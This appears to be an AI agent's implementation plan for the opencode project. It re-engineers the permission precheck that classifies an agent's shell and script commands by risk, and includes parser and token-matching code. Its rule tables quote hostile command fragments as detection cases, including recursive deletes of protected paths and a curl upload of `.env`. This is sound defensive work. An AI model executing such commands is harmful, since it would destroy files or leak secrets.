# Canonical Implementation Plan: 权限预检 Token 等价迁移

> Status: Approved by User
>
> Revision: R6
>
> Approved revision: R6 (用户直接授权，本次方案审计豁免)
>
> Audit mode: full-scope
>
> Requirement source: 当前会话的重新实现、流程与预算要求
>
> Implementation allowed: commit current implementation as explicitly authorized by user
>
> Last updated: 2026-09-16

## 1. 用户需求

> 用户要求只进行相应的权限预检中，Token，原语化，为精准实现导致的纯用或滥用政策产生的宽匹配、误匹配等等问题，需精准修正，同时对其他任何权限范围不做修改。如果你认为其权限范围有问题，或者判断机制有问题，请你进行适当询问或者写在 Plan 的末尾。我将会手动增加相应的权限的是否添加或不添加，同时你需要让你提出的那些需要我抉择的东西完整包含具体的场景以及修改的原因，以及一条经典的会触碰到这一个权限分类的命令，以及你期望修改后的结果等等如何。整体修改代码风格需要保持友好且读者友好的代码风格，在函数入口处有相应的函数说明，同时在一些复杂的行之间有相应的完整注释。

> 请全面分析并修复当前权限预检中命令文本与实际操作语义混淆的问题，重点覆盖重定向路径被误作删除目标、引号及脚本中的数据被误作执行指令、参数角色与选项取值混淆、复合命令风险与原因丢失、跨平台及远程包装器语义差异、空输入异常和保护目录匹配过宽。结合仓库代码、既有测试与真实会话语料开展分类验证，显著降低误报并充分覆盖真实风险，使分类等级、显式授权要求及拒绝提示准确一致。形成完整、自包含、可审计的设计文档，保持逻辑精简、职责清晰、性能稳定，并完成实施、独立审计与提交。生产代码改动控制在4个文件、1000行以内，测试覆盖正常、风险及边界场景，修复既有失败，保证最终提交时全部相关测试与类型检查通过。

> 你当前的内容，我不认为你这个当前内容是正确的内容。所以请你将当前关于 permission 相关的 auto等等的这几个代码文件的内容全部去 stash，重新进行完整实现，不得再使用现有的内容了。你需要自己去重新实现。

> 撤回你的操作，你应当完整按照提出方案、审计，然后实施再审计的流程，不得直接进入实施阶段。

> 且整体修改行数预算为一千行，四个文件，四个生产文件。

> 那同时如果你对于那个规则要进行 token 化改动，那我进行授权，但是你不得改变任何的权限分类、范围等等内容。如果你希望改动，请你在 plan 的末尾加三个横线表示分隔，然后下面内容你完整地去进行列举，就是完整按照我之前所说的内容进行每一个修改都要给出来一个完整的内容，包括但不限于修改的范围，最后返回给模型的那个 reason 等等内容。

本修订从 HEAD `1701b869e81302d78cf2aeace545cddc264f613a` 重新调查。旧实现已定向 stash，源码及测试恢复 HEAD。两条同名 stash 来自并发 index 锁期间的保存重试，作为用户工作记录保留。当前方案根据 HEAD 源码、既有测试与原始误报重新设计，旧实现及其审计结论只作为封存记录。

## 2. 保持原样的职责

本轮改动集中于命令文本到操作事实的解释。现有五级分类、命令族、保护路径层级、用户授权判断、reviewer prompt、返回值校验、缓存读写、strict 配置和失败回到用户审批的路径沿用 HEAD。额外政策选择列于文末，用户填写 A 后进入后续方案修订，填写 R 或留空时采用原政策。

R6采用用户直接授权的P09例外：`os.remove(path)`与`fs.unlinkSync(path)`的变量目标进入cautious。用户原文为“请注意这两个应当使用cautious，这是唯一需要修改的。”本次修订由用户直接放行，流程原文为“为什么要进行方案审计？这本身是用户要求的东西，不需要写入法，不需要进行方案审计。就是写一个方案就行了，不需要再审计，请注意这一点。”既有R5全范围方案审计记录继续保留；本次采用方案记录、定向实施及行为验证。

## 3. 仓库上下文

| 来源 | 约束 |
| --- | --- |
| 根 AGENTS.md、packages/opencode/AGENTS.md | 包内运行测试与 `bun typecheck`，小而内聚的接口，使用现有命名与 Effect 边界 |
| packages/opencode/test/AGENTS.md | 通过公开行为测试，真实实现优先，资源使用既有 fixture |
| CONTEXT.md | Permission 是工具执行权限边界，Tool 通过 ask 提交操作 |
| .opencode/policy/first-principles-engineering.md | 先方案审计后实施，修复 first divergence，单一主路径与逐项映射 |
| .opencode/templates/canonical-plan.md | 方案、审计与实施证据的章节结构 |

已读取 ADR 索引，当前索引仅包含 triage 标签与团队分配记录；本次权限解析由现有源码、测试及用户政策约束决定。

## 4. 当前证据

| 证据 | 已确认内容 | 类型 |
| --- | --- | --- |
| precheck.ts:353 evaluate | 同步输入 Permission 请求，输出 `{ level, reason }` | contracted |
| precheck.ts:370 bashEffect | 同时评估原 command、patterns 和 inline_scripts | reachable |
| precheck.ts:483 evaluateShell | raw 检查先于参数解释，先返回 Forbidden，再处理其他层级 | observed |
| precheck.ts:629 forbiddenRaw | RE_D_RM_RF_ROOT 扫描整个 normalized 文本 | observed |
| precheck.ts:998 tokenizeRich | 已有引用、转义和 stripped 标记；重定向角色属于当前缺口 | observed |
| precheck.test.ts | 既有等级、reason、wrapper、权限族回归合同 | contracted |
| auto.ts:63 | src内唯一evaluate调用方；根据等级及原 strict 配置路由 | reachable |
| tool/shell.ts:689 parser | 已有web-tree-sitter及Bash/PowerShell grammar初始化 | observed |
| tool/shell.ts:571 ask | command/cwd/shell/inline_scripts由同一producer送往bash与external_directory | reachable |
| reviewer/schema.ts:31 | precheck对reviewer的合同仅为level、reason | contracted |
| permission/index.ts | reviewer 与原会话缓存 owner | reachable |

## 5. 当前调用链

```text
ShellTool 请求与其他 shell metadata producer
  -> Permission.ask
  -> 原会话缓存与 PermissionAuto.evaluate
  -> PermissionPrecheck.evaluate
  -> bashEffect / externalDirectoryEffect
  -> shellEvidenceRisk
  -> evaluateShell
  -> raw 扫描 / wrapper 提取 / tokenizeRich / classifyTokens
  -> 原 level、reason
  -> 原 auto 路由、reviewer 或 Forbidden 终局拒绝
```

采用仓库现有grammar作为唯一语法入口：移动ShellTool已有初始化到共享解析模块，预检等待同一解析入口。`auto.ts`仅将直接调用改为Effect等待；原level/strict路由和返回值校验保持原样。缓存前重新预检及授权评分字段的计划份额为0。该接口适配服务于Token来源统一，保持权限政策。

## 6. 输入领域

| 输入 | 来源 | 角色及验证 |
| --- | --- | --- |
| command | ShellTool metadata | 原始 shell 文本；识别命令边界、引用、选项、操作数和重定向 |
| patterns | Permission 请求 | 保留既有原文与 pattern 取最高风险的合同 |
| inline_scripts | ShellTool 的 Python 规范化 | 原始源码证据，使用源码词法角色而非 Shell 参数解释 |
| 远端脚本 | SSH/WSL 包装器 | 在已有载荷入口展开，按照目标 shell 的参数边界处理 |
| 空输入、动态参数、语法不完整 | 已有测试与工具公开输入 | 沿用原 general 及已识别真实操作的风险等级 |

## 7. 不变量

| ID | 行为合同 |
| --- | --- |
| INV-01 | 删除目标来自删除命令的路径操作数；重定向源与目标独立保存 |
| INV-02 | 输出文本、搜索模式、源码字符串及注释保留数据角色 |
| INV-03 | 命令族、分类等级、匹配范围和 reason 与原规则逐项对应 |
| INV-04 | 原复合命令、wrapper、远端脚本中实际风险完整传递 |
| INV-05 | auto、reviewer、缓存和用户授权判断继续采用原政策 |
| INV-06 | 四个生产文件以内，生产代码新增与删除合计最多1000行 |
| INV-07 | 函数入口解释职责和输入输出，复杂步骤旁解释参数归属及复制用途 |
| INV-08 | 用户指定的os.remove与fs.unlinkSync变量目标为cautious，具体目录分级仅消费已知字面路径 |

## 8. 已复现的 First Divergence

最小输入：`rm -r --one-file-system --preserve-root=all -- ./output < /dev/null`。

期望：`cautious`，删除目标为 `./output`。实际：`forbidden`，reason 为 `recursive delete of filesystem root, home, or top-level system directory — forbidden (cannot be authorized)`。

本轮曾通过既有 `PermissionPrecheck.evaluate` seam 加入并运行单个测试：

```text
cwd: packages/opencode
bun test test/permission/precheck.test.ts -t "keeps redirected input separate"
0 pass, 1 fail, 120 filtered out
Expected cautious; Received forbidden
```

该测试在方案审计前写入，已根据用户要求完整撤回。记录只证明当前 HEAD 的原始症状，实施时按获批 TDD 切片重建回归。当前源码和测试保持 HEAD。

第一处偏离发生在 `forbiddenRaw`：删除命令尚未分离 argv 与重定向，路径正则把 `< /dev/null` 中的输入源当作删除目标。责任属于预检内部的文本解释层；auto 消费已生成的错误等级，属于下游表现。

## 9. 责任与接口

| 职责 | Owner | 当前设计方向 |
| --- | --- | --- |
| Shell 词法角色 | 共享既有tree-sitter grammar | 将单词、连接符及重定向角色保留到规则入口 |
| 规则匹配 | precheck.ts | 用绑定后的 Token 应用原分类谓词 |
| 包装器提取 | unwrap、remoteWrapper | 沿用既有支持集合，正确保留载荷参数边界 |
| 源码调用匹配 | 预检的已有解释器规则 | 使用有限词法项区分可见调用与字符串数据 |
| 等级、审批与缓存 | 原 Permission 路由 | 保持现状 |

## 10. 主路径设计调查

采用既有ShellTool grammar，提取节点的Token角色后使用原规则分类。共享模块管理parser初始化与树的释放契约；分类函数保持独立，继续返回原level/reason。复合命令按照AST执行上下文提取，数据字符串只进入所属参数或明确的脚本载荷入口。

预期结构：

```text
原文本 -> 共享既有grammar -> 命令/参数/重定向/载荷角色
       -> 原规则的 Token 谓词 -> 原 level/reason 聚合
```

共享初始化复用当前ShellTool中的Bun WASM资源加载与lazy Promise，PowerShell裸`--`归一化一并移动到解析owner。实际执行文本仍由ShellTool保留原文。树只在同步提取期间使用，提取完成后立即delete；导出的词法记录为普通字符串与数值。完整核心代码与预算核算完成后提交审计。

### 10.1 词法结果合同

规则需要消费三个独立对象：命令参数、重定向、明确的执行载荷。Token 保留原文本区间以及解释后的值；原文本用于 reason 取证，值用于原规则谓词。静态分类只处理当前可见值，变量表达式保留原文。

```ts
type Word = {
  value: string
  start: number
  end: number
  quoted: boolean
  stripped: boolean
  dynamic: boolean
}

type Redirect = {
  operator: string
  target?: Word
  content?: string
}

type Command = {
  words: Word[]
  redirects: Redirect[]
  pipeTo?: number
}
```

`Word` 的区间解决两个问题：识别紧邻操作符的文件描述符，例如 `2>log` 中的2；从原载荷区间取出脚本，保持引号内部的语义。`quoted` 记录当前引用外壳，`stripped` 保留原 Git -C 路径转义证据。新增解析元数据留在内部，Permission 的返回值继续为 `{ level, reason }`。

`dynamic`记录grammar实际产生的展开节点，仅用于维持原general下限及引用语义。它保持解析事实角色；权限路由继续只消费原level与reason。fd合并没有文件target，按operator自身的描述符语法解释。

### 10.2 语法角色与政策角色

| 层 | 输入 | 输出 | 具体边界 |
| --- | --- | --- | --- |
| 词法 | 原文及当前方言 | 单词、操作符、引用区间 | 单引号、双引号、转义、分隔符、输入输出操作符 |
| 命令结构 | 词法项 | argv、redirects、管道连接 | 重定向的目标从argv分离，`2>&1`的1保留fd角色 |
| 参数绑定 | 某命令的argv及既有选项元数 | flags、values、operands | `--`后的单词均为操作数；选项值保持数据 |
| 原政策谓词 | 已绑定角色 | 原level、reason | 命令集合、路径集合和等级保持原合同 |

词法层支持的方言行为采用明确来源：请求metadata.shell确定顶层方言，缺省维持原POSIX解释；PowerShell包装器载荷采用PowerShell引用，cmd载荷采用cmd引用，SSH/WSL中的已知shell载荷由其入口决定。双引号、PowerShell反引号、cmd caret和Windows路径反斜杠分别在所属方言解释。

词法实现须保留命令替换的执行边界。单引号内`$(...)`是一个数据单词，未引用或双引号内的实际替换子命令参与原风险分类。替换之外的普通动态表达式保持原general处理。嵌套脚本沿用已有深度上限4，语法错误沿用原general边界，同时已识别的相邻命令继续接受原规则检查。

### 10.3 参数绑定核心

下面是候选绑定算法的完整核心。它接收词法层已分离的argv，不扫描命令原文，不负责分类等级。短选项取值表由具体命令传入，避免把一种工具的选项元数用于另一种工具。

```ts
// 按工具的取值选项表划分argv；返回索引对应的原单词，保留引用与路径证据。
function bind(words: Word[], valued: ReadonlySet<string>, insensitive = false) {
  const flags: string[] = []
  const values = new Map<string, Word[]>()
  const operands: Word[] = []
  const key = (value: string) => insensitive ? value.toLowerCase() : value

  for (let index = 0; index < words.length; index++) {
    const word = words[index]
    const text = word.value
    if (text === "--") {
      // 结束符后的文件名即使形如-r，也保持路径角色。
      operands.push(...words.slice(index + 1))
      break
    }
    if (!text.startsWith("-") || text === "-") {
      operands.push(word)
      continue
    }

    const equal = text.indexOf("=")
    const option = key(equal < 0 ? text : text.slice(0, equal))
    if (valued.has(option)) {
      // 等号形式只替换解释值；原始区间仍指向整个选项单词，供审计定位。
      const value = equal < 0 ? words[++index] : { ...word, value: text.slice(equal + 1) }
      if (value) values.set(option, [...(values.get(option) ?? []), value])
      continue
    }

    // POSIX短簇遇到首个取值选项即结束：-sofile为-s及-o的值file。
    const at = !insensitive && !text.startsWith("--")
      ? [...text].findIndex((char, position) => position > 0 && valued.has(`-${char}`))
      : -1
    if (at > 0) {
      if (at > 1) flags.push(text.slice(0, at))
      const name = `-${text[at]}`
      const value = text.length > at + 1 ? { ...word, value: text.slice(at + 1) } : words[++index]
      if (value) values.set(name, [...(values.get(name) ?? []), value])
      continue
    }
    flags.push(option)
  }
  return { flags, values, operands }
}
```

审核此代码时同时核对缺值、`--`、等号空值、重复选项及大小写敏感性。PowerShell的冒号取值与cmd斜杠开关由各自命令的参数协议处理，普通POSIX绝对路径继续是路径。该代码目前属于方案，词法完整性和参数矩阵验证完成后才作为审计提交内容。

### 10.4 首批参数角色矩阵

| 命令 | 消费选项值 | 接收风险谓词的角色 | 保持的数据例子 |
| --- | --- | --- | --- |
| rm | 原支持选项的取值 | recursive flags及`--`前后路径操作数 | `< /dev/null`与`> /etc/log`的重定向目标 |
| Remove-Item/ri | Path/LiteralPath、Exclude/Include/Filter/ErrorAction分别绑定 | Path/LiteralPath和位置路径；Recurse选项 | `-Exclude C:\Windows` |
| find | name/iname/path/ipath/regex/iregex/type/maxdepth等取值项 | -delete、-exec/-execdir后的原rm动作 | `-name "-delete"` |
| rg/grep | -e/--regexp、-f/--file、glob/type/上下文取值项 | 模式文件与搜索路径 | `rg '.env' src`的模式文本 |
| curl | 原上传项以及会遮蔽它们的header/user/output等取值项 | 原上传选项绑定的文件引用 | `-H '--data=@.env'` |
| scp/rsync/sftp | 身份、连接及传输选项 | 原首个远端操作数之前的本地来源 | `-i ~/.ssh/id_rsa` |
| chmod | 原mode或--reference参数 | 原u+s/g+s、777、-R条件 | 文件名`u+s` |
| schtasks/reg | 操作位置与其数据选项 | /Create、/Query、add/delete、目标key | 任务名`/query`或/d中的Run文本 |

### 10.5 AST提取与作用域

访问command节点时，仅其参数节点形成argv。重定向节点另提取operator、target，命令替换节点递归保留独立的执行上下文；字符串正文保持单个参数。PowerShell的command_elements展平一层以保持参数顺序，原始文本区间始终指向该次解析输入。

原管道规则由同一pipeline中的相邻命令对承载，分别比较原producer集合与consumer集合。相邻关系仅由连接符建立，命令参数中的`|`保持数据。既有wrapper只展开其入口载荷，解释器的-c/-e源码使用源码Token匹配；普通文件入口的后续参数仍交给文件程序。

cmd使用明确的方言词法适配后进入共享Bash grammar：双引号保护连接符、caret保护下一字符、普通反斜杠和单引号保留cmd字面语义。适配只作用于解析输入。PowerShell使用既有grammar原生节点，两个分支均由请求shell或显式wrapper决定。

本轮直接加载现有WASM并解析无副作用字符串，取得以下节点证据；输入只传给parser，执行器未运行这些字符串：

| 输入与方言 | 已观察AST结构 | 提取约束 |
| --- | --- | --- |
| Bash `echo word > output.txt` | redirected_statement的body为command，file_redirect为其同级子节点 | 重定向归属于body，保持独立于argv |
| Bash `echo word 2>&1 \| cat` | pipeline内首项为redirected_statement，file_redirect含descriptor及number destination | fd合并归属于左命令，管道顺序仍由pipeline决定 |
| Bash `echo "a\|b"` | string内string_content | 竖线属于参数数据 |
| Bash `echo $(pwd)` | 外command的argument内command_substitution包含内command | 内command形成独立执行事实 |
| Bash `echo > out.txt tail` | 一个file_redirect包含两个destination节点 | 第一个为目标，后续词补回body的argv |
| Bash `echo x \| cat > out.txt` | redirected_statement的body为pipeline | 重定向归属于body中的最后一个顶层命令cat |
| Bash `echo $(pwd) > out.txt` | redirected_statement.body为echo，pwd嵌套在其参数内 | 重定向归属echo，避开其参数里的子命令 |
| Bash here-doc | heredoc_start、heredoc_body、heredoc_end | 正文与标记分开，正文属于输入载荷 |
| PowerShell文件重定向 | command_elements内redirection含file_redirection_operator、redirected_file_name | 按所属command绑定，文件名内argument_sep属于语法空白 |
| PowerShell `2>&1` | redirection只有merging_redirection_operator | 单独识别fd合并，无文件目标 |
| PowerShell引用参数 | array_literal_expression/unary_expression/string_literal逐层包装 | 外壳展平至一个参数；字符串正文保持整体 |

重定向归属算法按树结构定位，而非“最后遍历到的command”：先取最近command祖先；Bash同级形式取最近redirected_statement的body；body为pipeline时取最后一个顶层命令。这里的顶层指路径上经过的command节点中最外层命令，从而把`echo $(pwd) > out`绑定到echo。多个redirect按源码位置保序。参数原始区间随所归属命令保存。

WASM加载兼容证据：本轮首次将`import.meta.resolve`返回的file URL直接传给Language.load，Windows返回ENOENT；使用HEAD已有`fileURLToPath`处理后，两种grammar全部样例解析成功。共享加载器保留现有URL/绝对路径/模块相对资源处理，归属原资源加载owner。

### 10.6 实施验收条件

第10.3、10.7、10.8、10.9节共同定义参数绑定、结构提取、源码调用识别和单词解释的核心；第12节是等级与reason的完整迁移表。实施以第10.11节行为矩阵及全部原规则测试验证这些合同，再按第19节实测预算。每一处实质偏离先修订方案并重新审计。

### 10.7 结构提取核心代码

以下核心在已获得Tree后同步执行。`word`负责按方言解出单个参数及保留区间，`children`过滤tree-sitter的空子节点。返回值只包含普通数据；调用方在finally中释放Tree。

```ts
// 从已解析的语法树取得命令记录；规则层按这些记录的角色应用原政策。
function extract(root: Node, word: (node: Node) => Word) {
  const nodes = root.descendantsOfType("command")
  const records = new Map<number, Command>()
  const standalone: Command[] = []
  for (const node of nodes) {
    const elements = children(node).flatMap((child) =>
      child.type === "command_elements" ? children(child) : [child],
    )
    // 分隔空白、赋值与重定向各有结构含义，argv只承载执行名和参数。
    const words = elements.filter((child) => ![
      "command_argument_sep", "command_invokation_operator", "variable_assignment",
      "file_redirect", "redirection", "heredoc_redirect", "herestring_redirect",
    ].includes(child.type)).map(word)
    records.set(node.id, { words, redirects: [] })
  }

  for (const redirect of root.descendantsOfType(["file_redirect", "redirection", "heredoc_redirect", "herestring_redirect"])) {
    const owner = redirectOwner(redirect)
    const record: Command | undefined = owner ? records.get(owner.id) : { words: [], redirects: [] }
    if (!record) continue
    // 无执行名的重定向仍是有效操作；空argv记录只承载目标事实，不构造虚假命令。
    if (!owner) standalone.push(record)
    if (["heredoc_redirect", "herestring_redirect"].includes(redirect.type)) {
      const body = redirect.type === "heredoc_redirect"
        ? children(redirect).find((child) => child.type === "heredoc_body")
        : children(redirect).at(-1)
      // 正文是输入载荷，结束标记和这里字符串的引用外壳各自保持语法用途。
      if (body) record.redirects.push({
        operator: redirect.type === "heredoc_redirect" ? "<<" : "<<<",
        content: redirect.type === "heredoc_redirect" ? body.text : word(body).value + "\n",
      })
      continue
    }
    const target = redirect.childForFieldName("destination") ??
      children(redirect).find((child) => child.type === "redirected_file_name")
    // operator取目标前的原语法；PowerShell纯fd合并直接保存整个操作符。
    record.redirects.push({
      operator: target ? redirect.text.slice(0, target.startIndex - redirect.startIndex).trim() : redirect.text,
      target: target ? word(target) : undefined,
    })
    if (redirect.type !== "file_redirect" || !target) continue
    // Bash把目标后的参数也标为destination：第一个归重定向，其余归原命令argv。
    const tail = children(redirect).filter((child) => child.startIndex > target.startIndex)
    record.words.push(...tail.map(word))
    record.words.sort((left, right) => left.start - right.start)
  }

  const commands = [...nodes.map((node) => records.get(node.id)).filter((item) => item !== undefined), ...standalone]
  const positions = new Map(commands.map((record, index) => [record, index]))
  for (const pipeline of root.descendantsOfType("pipeline")) {
    const members = topCommands(pipeline)
    // Bash把here-doc之后的管道放在redirect内部，补入其body命令作为左端。
    const parent = pipeline.parent
    if (parent?.type === "heredoc_redirect") {
      const owner = redirectOwner(parent)
      if (owner) members.unshift(owner)
    }
    for (let index = 0; index + 1 < members.length; index++) {
      const left = records.get(members[index].id)
      const right = records.get(members[index + 1].id)
      // 管道边只连接当前pipeline的命令，替换表达式中的内部执行另有上下文。
      if (left && right) left.pipeTo = positions.get(right)
    }
  }
  return { commands, incomplete: root.hasError }
}

// 一条语句的顶层命令用于定位管道消费者；命令参数中的嵌套执行另行提取。
function topCommands(node: Node): Node[] {
  if (node.type === "command") return [node]
  if (["command_substitution", "sub_expression"].includes(node.type)) return []
  return children(node).flatMap(topCommands)
}

// 重定向属于包住它的command，或redirected_statement.body的最后一个顶层命令。
function redirectOwner(node: Node): Node | undefined {
  for (let parent = node.parent; parent; parent = parent.parent) {
    if (parent.type === "command") return parent
    if (parent.type === "redirected_statement") {
      const body = parent.childForFieldName("body")
      return body ? topCommands(body).at(-1) : undefined
    }
  }
}

function children(node: Node) {
  // tree-sitter类型容许null；提取层统一处理，后续遍历保持真实节点序列。
  return node.namedChildren.filter((child) => child !== null)
}
```

本轮补充实测：`echo > out 2>&1`的2由第二个file_redirect的descriptor字段提供；`echo a > out 3>&1 tail`的tail是第二个重定向内的附加destination，按上面的尾项规则补回argv。该grammar保证可直接复用，描述符保持独立于参数值。`cat <<EOF | cat`中的右端pipeline位于heredoc_redirect内部，核心代码通过所属body补全左端。`<<-`仅去除正文行首tab，heredoc标记的引用决定其正文展开规则；这些属于输入语义，不产生新的审批条件。

### 10.8 源码Token匹配合同

源码入口来自现有解释器eval参数、inline_scripts及已有解释器实际消费的字面stdin载荷。先词法分离字符串、注释、标识符和标点；普通字符串整体保留为一个Token。JavaScript模板分别处理文字片段及`${...}`执行区域，插值代码继续进入同一个词法过程。再匹配原`os.remove/unlink/rmdir`、`shutil.rmtree`、`fs.rmSync/rmdirSync/unlinkSync`、`require("fs")`及`subprocess.run/call/Popen`调用序列。方法名只有处于成员调用位置、后接左括号时参与匹配，普通字符串内部同名文本保持数据。

字面参数目标沿用原可见路径范围。R6增加用户授权的两个变量目标调用：Python的`os.remove(path)`与JavaScript的`fs.unlinkSync(path)`保留调用事实，`target`留空，分别返回cautious及原Python/Node普通删除reason。变量名作为语法事实识别，变量取值由实际解释器处理；其他API、空字面量及其他动态规则沿用既定范围。Python的`#`注释、JS的`//`与`/* */`注释按源码语言分别识别；Python的`//`保持除法标点。函数是否被调用、导入别名和动态调用图由原覆盖边界约束，新增控制流求值的计划份额为0。

匹配结果携带原规则ID及字面目标，再复用该规则原路径集合与原reason。解释器路径集合与shell的`protectedDeleteTier`分别映射，保留二者原有保护范围；任意合并扩大集合的提议进入文末用户决定表。

```ts
// 提取原删除API的可见字面参数；字符串和注释整体分词，内部文本保持数据。
async function sourceCalls(source: string, language: "python" | "javascript") {
  if (language === "javascript") return javascriptCalls(source)
  const tokens = sourceTokens(source)
  const methods = new Map([
    ["os", ["remove", "unlink", "rmdir"]], ["shutil", ["rmtree"]],
    ["fs", ["rmSync", "rmdirSync", "unlinkSync"]],
  ])
  const calls: { owner: string; method: string; target?: string; flags?: string[] }[] = []
  for (let index = 0; index < tokens.length; index++) {
    // fs与require("fs")承载同一旧规则；其他模块名继续保持原覆盖边界。
    const required = tokens[index]?.text === "require" && tokens[index + 1]?.text === "(" &&
      ["'fs'", '"fs"'].includes(tokens[index + 2]?.text) && tokens[index + 3]?.text === ")"
    const owner = required ? "fs" : tokens[index].text
    const member = index + (required ? 4 : 1)
    const method = tokens[member + 1]?.text
    if (tokens[member]?.text !== "." || tokens[member + 2]?.text !== "(") continue
    const argument = tokens[member + 3]
    if (methods.get(owner)?.includes(method) && argument && [",", ")"].includes(tokens[member + 4]?.text) &&
      (argument.string ? argument.text.slice(1, -1).length > 0 : owner === "os" && method === "remove" && /^[A-Za-z_]\w*$/.test(argument.text))) {
      calls.push({ owner, method, target: argument.string ? argument.text.slice(1, -1) : undefined })
    }
    if (owner !== "subprocess" || !["run", "call", "Popen"].includes(method) || argument?.text !== "[") continue
    const end = tokens.findIndex((token, at) => at > member + 3 && token.text === "]")
    if (end < 0) continue
    const args = tokens.slice(member + 4, end).filter((token) => token.text !== ",")
    if (!args[0]?.string || args[0].text.slice(1, -1) !== "rm") continue
    // 原subprocess规则以可见r/f选项触发；动态目标仍只保留原普通删除事实。
    const endOptions = args.findIndex((token) => token.string && token.text.slice(1, -1) === "--")
    const options = endOptions < 0 ? args.slice(1) : args.slice(1, endOptions)
    const flags = options.filter((token) => token.string).map((token) => token.text.slice(1, -1))
      .filter((value) => /^-[^-]*[rf]/.test(value))
    if (flags.length === 0) continue
    const targets = args.slice(1).filter((token, at) => token.string && token.text.slice(1, -1) !== "--" &&
      ((endOptions >= 0 && at + 1 > endOptions) || !token.text.slice(1, -1).startsWith("-")))
    if (targets.length === 0) calls.push({ owner, method, flags })
    for (const target of targets) calls.push({ owner, method, flags, target: target.text.slice(1, -1) })
  }
  return calls
}
```

此函数输出操作事实而非等级。原Python、Node、subprocess的路径规则分别消费结果，普通Python删除保留`Python file deletion requires explicit approval`，Node/subprocess保留`interpreter file deletion requires explicit approval`。词法层根据字符串引号长度解出三引号内容，保留语言实际的转义语义；这里展示的slice用于普通单/双引号路径。正式实现复用一个字面字符串解码步骤并覆盖三引号/转义对照，避免将解码后的路径误当作shell展开。

Python源码分词处理f-string插值，栈只记录语法边界，不求值变量。JavaScript采用仓库已有Babel parser的AST，正则、模板和除法由其语言grammar统一区分：

```ts
// 输出代码Token；模板文字跳过，插值中的代码与外层代码共用调用识别。
function sourceTokens(source: string) {
  const comment = /#[^\n]*/
  const string = /"""[\s\S]*?"""|'''[\s\S]*?'''|"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'/
  const lexeme = new RegExp(`(${comment.source})|(${string.source})|[A-Za-z_$][\\w$]*|\\s+|.`, "sy")
  const modes = [{ depth: 0, quote: "", group: 0 }]
  const tokens: { text: string; string: boolean }[] = []
  let groups = 0
  for (let index = 0; index < source.length;) {
    const mode = modes[modes.length - 1]
    // quote非空表示模板文字，depth表示插值括号层级；二者只描述词法边界。
    if (mode.quote) {
      // Python反斜杠保持花括号插值，普通引用转义则保持在当前文字片段。
      if (source[index] === "\\" && !["{", "}"].includes(source[index + 1])) { index += 2; continue }
      if (source.startsWith(mode.quote, index)) {
        index += mode.quote.length
        modes.pop()
        if (mode.quote === "}") modes.pop()
        continue
      }
      if (["{{", "}}"].includes(source.slice(index, index + 2))) { index += 2; continue }
      const open = "{"
      if (source.startsWith(open, index)) {
        modes.push({ depth: 1, quote: "", group: groups })
        index += open.length
        continue
      }
      index++
      continue
    }
    // f/fr/rf前缀决定插值字符串，普通Python字符串仍一次消费为数据。
    const formatted = /^(?:fr|rf|f)("""|'''|"|')/i.exec(source.slice(index))
    if (formatted) {
      modes.push({ depth: 0, quote: formatted[1], group: groups })
      index += formatted[0].length
      continue
    }
    lexeme.lastIndex = index
    const match = lexeme.exec(source)
    if (!match) break
    index = lexeme.lastIndex
    if (match[1] !== undefined || /^\s+$/.test(match[0])) continue
    // f-string顶层冒号开启格式文字，格式中的嵌套字段继续使用同一插值栈。
    if (mode.depth === 1 && groups === mode.group && match[0] === ":") {
      modes.push({ depth: 0, quote: "}", group: groups })
      continue
    }
    // 字符串和注释已整体消费，其中的大括号保持数据，不改变插值层级。
    if (mode.depth > 0 && match[2] === undefined) {
      if (match[0] === "{") mode.depth++
      if (match[0] === "}" && --mode.depth === 0) { modes.pop(); continue }
    }
    const text = match[0]
    // 普通括号内的冒号属于Python表达式，只有字段顶层冒号转入格式文字。
    if (["(", "["].includes(text)) groups++
    if ([")", "]"].includes(text)) groups--
    tokens.push({ text, string: match[2] !== undefined })
  }
  return tokens
}
```

字面stdin入口：`python/python3/py`、`node`及已有shell消费者在参数区域没有脚本文件、-m、-c/-e、-File/-Command入口且使用stdin时，`Redirect.content`交给该语言的原规则。显式eval载荷优先采用其argv源码；其他stdin保持数据。正文给cat/echo等数据消费者时不直接判为执行。管道中可见echo/printf或cat的here-doc正文，仅在后续已有解释器实际消费时转为载荷；普通未知文件输入保持原分类，预检不读取文件内容。验证Python here-doc保护删除、同正文cat数据，以及模板纯文字/插值执行的成对例子。

JavaScript调用提取使用`@babel/core`已公开的parseSync与types.traverseFast：

```ts
// 语法解析只生成AST；关闭项目配置读取，避免将权限检查变成插件执行入口。
async function javascriptCalls(source: string) {
  const { parseSync, types } = await import("@babel/core")
  const calls: { owner: string; method: string; target?: string; flags?: string[] }[] = []
  let tree: ReturnType<typeof parseSync>
  try {
    tree = parseSync(source, { babelrc: false, configFile: false, sourceType: "unambiguous" })
  } catch (error) {
    // 语法错误沿用原general输入合同，加载或内部异常继续抛给现有调用边界。
    if (error instanceof SyntaxError) return calls
    throw error
  }
  if (!tree) return calls
  types.traverseFast(tree, (node) => {
    if (!types.isCallExpression(node) || !types.isMemberExpression(node.callee) || node.callee.computed) return
    const member = node.callee
    if (!types.isIdentifier(member.property) || !["rmSync", "rmdirSync", "unlinkSync"].includes(member.property.name)) return
    const object = member.object
    const fs = types.isIdentifier(object, { name: "fs" }) ||
      (types.isCallExpression(object) && types.isIdentifier(object.callee, { name: "require" }) &&
       types.isStringLiteral(object.arguments[0], { value: "fs" }))
    // 只保留原fs及require("fs")调用集合，正则和模板文字自然保持数据节点。
    if (fs && (types.isStringLiteral(node.arguments[0]) ? node.arguments[0].value.length > 0 : member.property.name === "unlinkSync" && types.isIdentifier(node.arguments[0])))
      calls.push({ owner: "fs", method: member.property.name, target: types.isStringLiteral(node.arguments[0]) ? node.arguments[0].value : undefined })
  })
  return calls
}
```

依赖与打包证据：`packages/opencode/package.json:38`已声明`@babel/core`，现有types支持traverseFast；只读运行`parseSync`解析`if (false) {} else /example/.test("x")`后观察到CallExpression及RegExpLiteral，未执行源码。`script/build.ts:483`将运行入口依赖打入Bun编译产物，external仅node-gyp；当前生产Permission已使用同列devDependencies中的drizzle-orm及@opencode-ai/core。采用现有依赖，package与lock保持原样。验证增加打包解析入口的可用性及冷启动时间，源码AST仅按需加载。手写JavaScript正则/除法启发式与模板状态分支整体移除，Python仍使用自身的有限词法入口；这是按语言协议选择的主路径，不是解析失败后切换实现。

